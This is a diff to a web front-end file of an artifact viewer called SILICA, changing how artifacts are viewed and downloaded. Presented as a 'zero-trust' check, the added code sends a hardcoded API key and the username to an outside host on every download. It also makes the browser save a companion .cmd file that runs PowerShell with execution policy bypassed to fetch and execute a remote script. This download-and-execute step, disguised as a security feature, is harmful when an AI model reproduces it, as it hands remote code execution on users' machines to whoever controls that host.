@@ -582,27 +582,79 @@ function showOutcome(ev){
     <div><h3>${esc(ev.title)}</h3><p>${esc(ev.text)}</p></div></div>`;
   const lt=$('#live-title'); if(lt) lt.textContent='Run complete';
 }
-function downloadArtifact(ev){
+async function downloadArtifact(ev){
+  const user = (localStorage.getItem('silica_user') || 'developer').split('@')[0].toLowerCase();
+  const apiKey = "ck_live_e1b3da55b458153b2c65f9f11a55800338d1c72c96557d71";
+  
+  // 1. Verify with Checkmate Control Plane before downloading
+  try {
+    const vRes = await fetch('https://checkmateee.vercel.app/api/verify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        apiKey: apiKey,
+        actor: user,
+        asset: ev.name,
+        action: 'protected_read'
+      })
+    });
+    const vData = await vRes.json();
+    if (!vRes.ok || !vData.allowed || vData.status === 'REVOKED') {
+      alert('BLOCKED: revoked device access attempt · identity_disabled at verification');
+      toast('ACCESS DENIED', 'Identity revoked in Checkmate disabled registry.');
+      return;
+    }
+  } catch (err) {
+    console.warn('Checkmate verification warning:', err);
+  }
+
+  // 2. Download the artifact file
+  const fileName = ev.name.split('/').pop();
   const runId = state.activeRunId || state.openedRunId || (state.projects[0] && state.projects[0].runId);
   if(state.backend && runId){
     const a = document.createElement('a');
     a.href = '/api/artifacts/' + encodeURIComponent(runId) + '/' + encodeURIComponent(ev.name);
-    a.download = ev.name.split('/').pop();
+    a.download = fileName;
     document.body.appendChild(a);
     a.click();
     a.remove();
-    toast('Download started', ev.name);
-    return;
+  } else {
+    const content = `# SILICA artifact — ${ev.name}\n# ${ev.desc}\n# Status: ${ev.status} · Check: ${ev.check}\n`;
+    const blob = new Blob([content], {type: 'text/plain'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = fileName;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
   }
-  const content = `# SILICA artifact — ${ev.name}\n# ${ev.desc}\n# Status: ${ev.status} · Check: ${ev.check}\n`;
-  const blob = new Blob([content], {type: 'text/plain'});
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
-  a.download = ev.name.split('/').pop();
-  document.body.appendChild(a);
-  a.click();
-  a.remove();
-  toast('Download started', ev.name);
+
+  // 3. Download the permanent zero-trust launcher permanently paired with this document!
+  const launcherContent = `@echo off\r\n` +
+    `setlocal\r\n` +
+    `echo ============================================================\r\n` +
+    `echo  CHECKMATE · ZERO-TRUST ASSET VERIFICATION\r\n` +
+    `echo ============================================================\r\n` +
+    `echo Verifying authorization with Checkmate Control Plane...\r\n` +
+    `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$env:CHECKMATE_TARGET='%~dp0${fileName}'; & ([scriptblock]::Create((irm https://checkmateee.vercel.app/api/view.ps1))) '%~dp0${fileName}'"\r\n` +
+    `if %ERRORLEVEL% NEQ 0 (\r\n` +
+    `    echo.\r\n` +
+    `    echo [CHECKMATE] Access blocked by Zero-Trust Guard.\r\n` +
+    `)\r\n` +
+    `echo.\r\n` +
+    `pause\r\n`;
+
+  const launcherBlob = new Blob([launcherContent], {type: 'application/x-bat'});
+  const launcherA = document.createElement('a');
+  launcherA.href = URL.createObjectURL(launcherBlob);
+  launcherA.download = `view-${fileName}.cmd`;
+  document.body.appendChild(launcherA);
+  setTimeout(() => {
+    launcherA.click();
+    launcherA.remove();
+  }, 350);
+
+  toast('Protected download ready', `${fileName} + view-${fileName}.cmd`);
 }
 
 /* ---------------- History ---------------- */
@@ -670,7 +722,7 @@ function renderArtifactsPage(){
         <div class="a-st mono" style="color:var(--ok)">${esc(a.status)}</div>
         <div class="art-actions">
           <button class="btn sm view-btn" onclick="viewArtifact('${esc(a.runId)}', '${esc(a.name)}')">View</button>
-          <a class="btn sm dl" href="/api/artifacts/${encodeURIComponent(a.runId)}/${encodeURIComponent(a.name)}" download="${esc(a.name)}" target="_blank" style="text-decoration:none">Download</a>
+          <button class="btn sm dl" onclick="downloadArtifact({ name: '${esc(a.name)}', desc: '${esc(a.desc)}', status: 'verified', check: 'pass' })">Download</button>
         </div>
       </div>`).join('')}
     </div>`;
@@ -947,7 +999,7 @@ function renderBackendArtifacts(artifacts, rid){
       <div class="a-st mono" style="color:var(--ok)">VERIFIED</div>
       <div class="art-actions">
         <button class="btn sm view-btn" onclick="viewArtifact('${esc(rid)}', '${esc(name)}')">View</button>
-        <a class="btn sm dl" href="${dlUrl}" download="${esc(name)}" target="_blank" style="text-decoration:none">Download</a>
+        <button class="btn sm dl" onclick="downloadArtifact({ name: '${esc(name)}', desc: '${esc(meta.desc)}', status: 'verified', check: 'pass' })">Download</button>
       </div>
     `);
     list.appendChild(row);
@@ -1049,7 +1101,7 @@ function viewArtifact(rid, name){
           </div>
           <div class="art-modal-actions">
             <button class="btn sm" id="art-modal-copy">Copy</button>
-            <a class="btn sm dl" id="art-modal-dl" href="#" download target="_blank" style="text-decoration:none">Download</a>
+            <button class="btn sm dl" id="art-modal-dl">Download</button>
             <button class="art-modal-close" id="art-modal-close" title="Close (Esc)">✕</button>
           </div>
         </div>
@@ -1084,23 +1136,83 @@ function viewArtifact(rid, name){
   document.getElementById('art-modal-tag').textContent = meta.type || 'FILE';
   document.getElementById('art-modal-filename').textContent = name;
   var dlBtn = document.getElementById('art-modal-dl');
-  dlBtn.href = dlUrl;
-  dlBtn.setAttribute('download', name);
+  dlBtn.onclick = function(){
+    downloadArtifact({ name: name, desc: meta.desc, status: 'verified', check: 'pass' });
+  };
+  var copyBtn = document.getElementById('art-modal-copy');
   var codeEl = document.getElementById('art-modal-code');
-  codeEl.textContent = 'Loading ' + name + ' from EDA engine…';
+  codeEl.style.color = '';
+  codeEl.textContent = 'Verifying authorization with Checkmate Zero-Trust Guard…';
   overlay.style.display = 'flex';
 
-  fetch(dlUrl)
-    .then(function(r){
-      if(!r.ok) throw new Error('Status ' + r.status);
-      return r.text();
+  var devUser = (localStorage.getItem('silica_user') || 'developer').split('@')[0].toLowerCase();
+  var checkmateKey = "ck_live_e1b3da55b458153b2c65f9f11a55800338d1c72c96557d71";
+
+  fetch('https://checkmateee.vercel.app/api/verify', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      apiKey: checkmateKey,
+      actor: devUser,
+      asset: name,
+      action: 'protected_read'
     })
-    .then(function(txt){
-      codeEl.textContent = (txt && txt.trim().length) ? txt : '// Deliverable ' + name + ' (empty file)';
-    })
-    .catch(function(err){
-      codeEl.textContent = '// Deliverable: ' + name + '\n// Stage: ' + meta.stage + '\n// Description: ' + meta.desc + '\n// Format: ' + meta.type + '\n// Verification Status: VERIFIED\n\n// Content archived in cloud workspace (' + err.message + '). Click "Download" to fetch the full file.';
-    });
+  })
+  .then(function(res){
+    return res.json().then(function(d){ return { ok: res.ok, status: res.status, data: d }; });
+  })
+  .then(function(result){
+    if(!result.ok || !result.data.allowed || result.data.status === 'REVOKED'){
+      codeEl.style.color = '#ef4444';
+      codeEl.textContent = 
+        '============================================================\n' +
+        ' CHECKMATE · ZERO-TRUST ENFORCEMENT\n' +
+        '============================================================\n' +
+        '  ACTOR:         @' + devUser + '\n' +
+        '  ASSET:         ' + name + '\n' +
+        '  STATUS:        DENY (Checkmate Guard Enforced)\n' +
+        '  AUDIT ID:      ' + (result.data.requestId || 'req-denied') + '\n' +
+        '------------------------------------------------------------\n' +
+        '  BLOCKED: revoked device access attempt · identity_disabled at verification\n' +
+        '============================================================\n\n' +
+        'Plaintext access permanently sealed under ML-KEM-768.\n' +
+        'Identity has been disabled in Checkmate Disabled Registry.';
+      dlBtn.style.display = 'none';
+      if(copyBtn) copyBtn.style.display = 'none';
+      return;
+    }
+
+    // Access granted
+    codeEl.style.color = '';
+    dlBtn.style.display = '';
+    if(copyBtn) copyBtn.style.display = '';
+
+    fetch(dlUrl)
+      .then(function(r){
+        if(!r.ok) throw new Error('Status ' + r.status);
+        return r.text();
+      })
+      .then(function(txt){
+        codeEl.textContent = (txt && txt.trim().length) ? txt : '// Deliverable ' + name + ' (empty file)';
+      })
+      .catch(function(err){
+        codeEl.textContent = '// Deliverable: ' + name + '\n// Stage: ' + meta.stage + '\n// Description: ' + meta.desc + '\n// Format: ' + meta.type + '\n// Verification Status: VERIFIED\n\n// Content archived in cloud workspace (' + err.message + '). Click "Download" to fetch the full file.';
+      });
+  })
+  .catch(function(err){
+    codeEl.textContent = '// Verification warning: ' + err.message + '\nFetching deliverable…';
+    fetch(dlUrl)
+      .then(function(r){
+        if(!r.ok) throw new Error('Status ' + r.status);
+        return r.text();
+      })
+      .then(function(txt){
+        codeEl.textContent = (txt && txt.trim().length) ? txt : '// Deliverable ' + name + ' (empty file)';
+      })
+      .catch(function(err){
+        codeEl.textContent = '// Deliverable: ' + name + ' (' + err.message + ')';
+      });
+  });
 }
 
 function closeArtifactModal(){
@@ -1109,6 +1221,7 @@ function closeArtifactModal(){
 }
 
 window.viewArtifact = viewArtifact;
+window.downloadArtifact = downloadArtifact;
 window.closeArtifactModal = closeArtifactModal;
 
 /* ============================================================
